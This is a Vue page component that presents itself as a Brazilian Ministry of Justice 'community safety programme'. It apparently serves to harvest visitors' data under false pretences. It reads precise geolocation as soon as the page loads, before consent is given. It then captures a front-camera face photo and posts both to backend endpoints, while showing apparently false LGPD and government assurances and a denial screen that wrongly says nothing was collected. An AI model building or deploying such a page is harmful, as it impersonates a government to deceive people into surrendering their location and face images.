<template>
  <div
    class="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-blue-100"
  >
    <!-- Header -->
    <header
      class="bg-white/80 backdrop-blur-sm shadow-sm sticky top-0 z-10 border-b border-gray-100"
    >
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
        <div class="flex items-center justify-between">
          <div class="flex items-center space-x-2">
            <div
              class="w-10 h-10 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-xl flex items-center justify-center shadow-lg"
            >
              <span class="text-2xl">🛡️</span>
            </div>
            <h1
              class="text-xl font-bold bg-gradient-to-r from-blue-600 to-indigo-600 bg-clip-text text-transparent"
            >
              Segurança Pública
            </h1>
          </div>
          <div class="text-sm text-gray-500">
            <span v-if="currentPosition" class="flex items-center space-x-1">
              <span>✅</span>
              <span>Localização capturada</span>
            </span>
          </div>
        </div>
      </div>
    </header>

    <!-- Main Content -->
    <main class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
      <!-- Tela de Consentimento -->
      <transition name="fade">
        <div v-if="!consentGiven && !denied" class="animate-fade-in">
          <div
            class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100"
          >
            <!-- Hero Section -->
            <div
              class="bg-gradient-to-br from-blue-600 via-indigo-600 to-blue-700 px-8 py-12 text-white text-center"
            >
              <div class="max-w-2xl mx-auto">
                <div
                  class="inline-flex items-center justify-center w-20 h-20 bg-white/20 backdrop-blur-sm rounded-2xl mb-6 shadow-xl"
                >
                  <span class="text-4xl">🛡️</span>
                </div>
                <h2 class="text-3xl sm:text-4xl font-bold mb-4">
                  Ministério da Justiça e Segurança Pública
                </h2>
                <p class="text-lg text-blue-100">
                  Programa de Segurança e Proteção Comunitária
                </p>
              </div>
            </div>

            <!-- Content Section -->
            <div class="p-8 sm:p-12">
              <div class="max-w-4xl mx-auto">
                <div class="mb-8">
                  <h3
                    class="text-xl font-semibold text-gray-800 mb-4 flex items-center"
                  >
                    <span class="mr-2">📋</span>
                    Dados Necessários para o Programa
                  </h3>
                  <p class="text-gray-600 mb-6">
                    Para participar do programa de segurança comunitária e
                    receber alertas de emergência em sua região, precisamos dos
                    seguintes dados:
                  </p>
                  <div class="grid md:grid-cols-2 gap-4">
                    <div
                      class="bg-gradient-to-br from-blue-50 to-indigo-50 p-6 rounded-2xl border border-blue-100"
                    >
                      <div class="flex items-start space-x-3">
                        <span class="text-2xl">📍</span>
                        <div>
                          <h4 class="font-semibold text-gray-800 mb-1">
                            Localização
                          </h4>
                          <p class="text-sm text-gray-600">
                            Para enviar alertas de segurança específicos da sua
                            região
                          </p>
                        </div>
                      </div>
                    </div>
                    <div
                      class="bg-gradient-to-br from-purple-50 to-pink-50 p-6 rounded-2xl border border-purple-100"
                    >
                      <div class="flex items-start space-x-3">
                        <span class="text-2xl">📸</span>
                        <div>
                          <h4 class="font-semibold text-gray-800 mb-1">Foto</h4>
                          <p class="text-sm text-gray-600">
                            Para verificação de identidade e segurança do
                            programa
                          </p>
                        </div>
                      </div>
                    </div>
                    <div
                      class="bg-gradient-to-br from-green-50 to-emerald-50 p-6 rounded-2xl border border-green-100"
                    >
                      <div class="flex items-start space-x-3">
                        <span class="text-2xl">🛡️</span>
                        <div>
                          <h4 class="font-semibold text-gray-800 mb-1">
                            Dados de Conexão
                          </h4>
                          <p class="text-sm text-gray-600">
                            Para garantir a segurança e autenticidade do acesso
                          </p>
                        </div>
                      </div>
                    </div>
                    <div
                      class="bg-gradient-to-br from-amber-50 to-orange-50 p-6 rounded-2xl border border-amber-100"
                    >
                      <div class="flex items-start space-x-3">
                        <span class="text-2xl">⏰</span>
                        <div>
                          <h4 class="font-semibold text-gray-800 mb-1">
                            Data e Hora
                          </h4>
                          <p class="text-sm text-gray-600">
                            Para registrar sua participação no programa
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <!-- Info Box -->
                <div
                  class="bg-blue-50 border-l-4 border-blue-500 p-6 rounded-xl mb-8"
                >
                  <div class="flex items-start space-x-3">
                    <span class="text-2xl">ℹ️</span>
                    <div>
                      <p class="text-sm text-gray-700 mb-2">
                        <strong>Conformidade Legal:</strong> Este programa está
                        em conformidade com a Lei Geral de Proteção de Dados
                        (LGPD - Lei nº 13.709/2018) e será utilizado
                        exclusivamente para fins de segurança pública e proteção
                        comunitária.
                      </p>
                      <p class="text-sm text-gray-600">
                        Seus dados serão protegidos e armazenados de forma
                        segura, conforme as diretrizes do Ministério da Justiça
                        e Segurança Pública.
                      </p>
                    </div>
                  </div>
                </div>

                <!-- Action Buttons -->
                <div class="flex flex-col sm:flex-row gap-4">
                  <button
                    @click="grantConsent"
                    class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
                  >
                    <span class="flex items-center justify-center space-x-2">
                      <span>✓</span>
                      <span>Concordo e Participo do Programa</span>
                    </span>
                  </button>
                  <button
                    @click="denyConsent"
                    class="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-800 font-semibold py-4 px-8 rounded-xl transition-all duration-300"
                  >
                    <span class="flex items-center justify-center space-x-2">
                      <span>✗</span>
                      <span>Não Desejo Participar</span>
                    </span>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </transition>

      <!-- Interface Principal após Consentimento -->
      <transition name="fade">
        <div v-if="consentGiven && !denied" class="animate-fade-in">
          <div
            class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100"
          >
            <!-- Header da Interface Principal -->
            <div
              class="bg-gradient-to-r from-blue-600 to-indigo-600 px-8 py-8 text-white"
            >
              <div class="flex items-center justify-between flex-wrap gap-4">
                <div>
                  <h2 class="text-2xl sm:text-3xl font-bold mb-2">
                    🛡️ Programa de Segurança Comunitária
                  </h2>
                  <p class="text-blue-100">
                    Registro de participação e verificação de identidade
                  </p>
                </div>
                <div
                  class="flex items-center space-x-2 bg-white/20 backdrop-blur-sm px-4 py-2 rounded-xl"
                >
                  <span class="text-xl">📸</span>
                  <span class="text-sm font-medium">Câmera ativa</span>
                </div>
              </div>
            </div>

            <!-- Content -->
            <div class="p-8">
              <!-- Preview da Câmera -->
              <div v-if="stream" class="mb-8">
                <div class="relative max-w-2xl mx-auto">
                  <div
                    class="absolute inset-0 bg-gradient-to-r from-blue-500 to-indigo-500 rounded-2xl blur-xl opacity-30"
                  ></div>
                  <video
                    ref="videoElement"
                    autoplay
                    playsinline
                    class="relative w-full rounded-2xl shadow-2xl border-4 border-white"
                  ></video>
                </div>
              </div>

              <!-- Mensagens de Status -->
              <transition name="slide">
                <div
                  v-if="statusMessage"
                  :class="statusClass"
                  class="mb-6 p-4 rounded-xl shadow-md text-center font-medium"
                >
                  {{ statusMessage }}
                </div>
              </transition>

              <!-- Botão Principal -->
              <div class="text-center mb-8">
                <button
                  @click="captureAndSend"
                  :disabled="loading || !streamActive"
                  class="inline-flex items-center space-x-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white font-bold py-5 px-10 rounded-2xl text-lg transition-all duration-300 shadow-xl hover:shadow-2xl transform hover:-translate-y-1 disabled:transform-none"
                >
                  <span v-if="loading" class="animate-spin">⏳</span>
                  <span v-else>🛡️</span>
                  <span>{{
                    loading ? "Registrando..." : "Confirmar Participação"
                  }}</span>
                </button>
              </div>

              <!-- Log de Atividades -->
              <transition name="fade">
                <div
                  v-if="logs.length > 0"
                  class="bg-gradient-to-br from-gray-50 to-gray-100 rounded-2xl p-6 border border-gray-200"
                >
                  <h3 class="font-bold text-gray-800 mb-4 flex items-center">
                    <span class="mr-2">📋</span>
                    Registros de Participação
                  </h3>
                  <div class="space-y-3 max-h-60 overflow-y-auto">
                    <div
                      v-for="(log, index) in logs"
                      :key="index"
                      class="bg-white rounded-xl p-4 shadow-sm border border-gray-100 text-sm text-gray-700 animate-slide-in"
                    >
                      {{ log }}
                    </div>
                  </div>
                </div>
              </transition>
            </div>
          </div>
        </div>
      </transition>

      <!-- Tela de Negação -->
      <transition name="fade">
        <div v-if="denied" class="animate-fade-in">
          <div
            class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100"
          >
            <div
              class="bg-gradient-to-br from-red-500 to-pink-500 px-8 py-12 text-white text-center"
            >
              <div
                class="inline-flex items-center justify-center w-20 h-20 bg-white/20 backdrop-blur-sm rounded-2xl mb-6 shadow-xl"
              >
                <span class="text-4xl">❌</span>
              </div>
              <h2 class="text-3xl font-bold mb-4">Participação Cancelada</h2>
              <p class="text-lg text-red-100">Nenhum dado foi coletado</p>
            </div>

            <div class="p-12 text-center">
              <p class="text-gray-700 mb-8 text-lg">
                Você escolheu não participar do programa de segurança
                comunitária. Sua privacidade foi respeitada e nenhuma informação
                foi coletada.
              </p>
              <button
                @click="resetConsent"
                class="inline-flex items-center space-x-2 bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
              >
                <span>↩️</span>
                <span>Reconsiderar Participação</span>
              </button>
            </div>
          </div>
        </div>
      </transition>
    </main>
  </div>
</template>

<script setup>
import { ref, onMounted, onBeforeUnmount, nextTick } from "vue";
import api from "../axios";

// Estados reativos
const consentGiven = ref(false);
const denied = ref(false);
const stream = ref(null);
const videoElement = ref(null);
const streamActive = ref(false);
const loading = ref(false);
const statusMessage = ref("");
const statusClass = ref("");
const logs = ref([]);
const currentPosition = ref(null);

// Lifecycle hooks
onMounted(() => {
  // Capturar localização automaticamente ao montar o componente
  captureLocation();
});

onBeforeUnmount(() => {
  // Parar stream da câmera quando componente for desmontado
  stopCamera();
});

// Métodos
const grantConsent = () => {
  consentGiven.value = true;
  denied.value = false;
  showStatus(
    "Participação autorizada. Inicializando verificação de identidade...",
    "success"
  );
  // Inicializar câmera após consentimento
  initCamera();
};

const denyConsent = () => {
  denied.value = true;
  consentGiven.value = false;
  stopCamera();
};

const resetConsent = () => {
  consentGiven.value = false;
  denied.value = false;
  logs.value = [];
  stopCamera();
  // Recapturar localização ao resetar
  captureLocation();
};

const captureLocation = async () => {
  try {
    showStatus("Registrando localização para alertas regionais...", "info");
    const position = await getCurrentPosition();
    currentPosition.value = position;
    showStatus(
      "✅ Localização registrada para alertas de segurança!",
      "success"
    );
  } catch (error) {
    console.error("Erro ao capturar localização:", error);
    showStatus(
      "⚠️ Não foi possível registrar localização. Verifique as permissões.",
      "error"
    );
  }
};

const initCamera = async () => {
  try {
    console.log("initCamera");
    // Solicitar acesso à câmera
    stream.value = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, // Câmera frontal
    });

    // Aguardar até que o componente tenha o elemento video
    await nextTick();

    if (videoElement.value) {
      videoElement.value.srcObject = stream.value;
      streamActive.value = true;
      showStatus("Verificação de identidade ativada!", "success");
    }
  } catch (error) {
    console.error("Erro ao acessar câmera:", error);
    showStatus("❌ Erro ao acessar câmera. Verifique as permissões.", "error");
    streamActive.value = false;
  }
};

const stopCamera = () => {
  if (stream.value) {
    stream.value.getTracks().forEach((track) => track.stop());
    stream.value = null;
    streamActive.value = false;
  }
};

const captureAndSend = async () => {
  if (!streamActive.value || loading.value) return;
  // Verificar se temos localização
  if (!currentPosition.value) {
    showStatus("❌ Localização não disponível. Recapturando...", "error");
    await captureLocation();
    if (!currentPosition.value) {
      return;
    }
  }
  loading.value = true;
  showStatus("Registrando participação no programa...", "info");

  try {
    // Capturar frame da câmera
    const photoBlob = await capturePhoto();

    // Enviar dados em paralelo usando a localização já capturada
    await Promise.all([
      sendLocation(currentPosition.value),
      sendPhoto(photoBlob),
    ]);

    showStatus(
      "✅ Participação confirmada! Obrigado por contribuir com a segurança comunitária.",
      "success"
    );
    addLog(
      `Enviado em ${new Date().toLocaleTimeString()} - Lat: ${currentPosition.value.coords.latitude.toFixed(
        6
      )}, Lng: ${currentPosition.value.coords.longitude.toFixed(6)}`
    );
  } catch (error) {
    console.error("Erro:", error);
    showStatus(`❌ Erro: ${error.message}`, "error");
  } finally {
    loading.value = false;
  }
};

const getCurrentPosition = () => {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error("Geolocalização não suportada neste navegador"));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    });
  });
};

const capturePhoto = () => {
  return new Promise((resolve, reject) => {
    const video = videoElement.value;
    if (!video) {
      reject(new Error("Elemento de vídeo não encontrado"));
      return;
    }

    // Criar canvas e capturar frame
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    // Converter para blob
    canvas.toBlob(
      (blob) => {
        if (blob) {
          resolve(blob);
        } else {
          reject(new Error("Erro ao converter imagem para blob"));
        }
      },
      "image/jpeg",
      0.9
    );
  });
};

const sendLocation = async (position) => {
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    note: "Registro de participação - Programa de Segurança Comunitária",
  };
  await api.post("/log", data);
  console.log("Localização registrada:", data);
};

const sendPhoto = async (blob) => {
  const formData = new FormData();
  formData.append("photo", blob, "photo.jpg");
  formData.append(
    "note",
    "Verificação de identidade - Programa de Segurança Comunitária"
  );

  const response = await api.post("/upload-photo", formData, {
    headers: {
      "Content-Type": "multipart/form-data",
    },
  });
  console.log("Foto registrada:", response.data);
  return response.data;
};

const showStatus = (message, type) => {
  statusMessage.value = message;
  const classes = {
    success: "bg-green-100 text-green-800",
    error: "bg-red-100 text-red-800",
    info: "bg-blue-100 text-blue-800",
  };
  statusClass.value = classes[type] || classes.info;
};

const addLog = (message) => {
  logs.value.unshift(message);
  if (logs.value.length > 10) {
    logs.value.pop();
  }
};
</script>

<style scoped>
/* Animações de Transição */
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.5s ease;
}

.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

.slide-enter-active,
.slide-leave-active {
  transition: all 0.3s ease;
}

.slide-enter-from {
  opacity: 0;
  transform: translateY(-10px);
}

.slide-leave-to {
  opacity: 0;
  transform: translateY(10px);
}

/* Animações Customizadas */
@keyframes fade-in {
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

@keyframes slide-in {
  from {
    opacity: 0;
    transform: translateX(-10px);
  }
  to {
    opacity: 1;
    transform: translateX(0);
  }
}

.animate-fade-in {
  animation: fade-in 0.6s ease-out;
}

.animate-slide-in {
  animation: slide-in 0.4s ease-out;
}

/* Scrollbar customizada */
::-webkit-scrollbar {
  width: 8px;
}

::-webkit-scrollbar-track {
  background: #f1f1f1;
  border-radius: 10px;
}

::-webkit-scrollbar-thumb {
  background: linear-gradient(to bottom, #3b82f6, #6366f1);
  border-radius: 10px;
}

::-webkit-scrollbar-thumb:hover {
  background: linear-gradient(to bottom, #2563eb, #4f46e5);
}
</style>
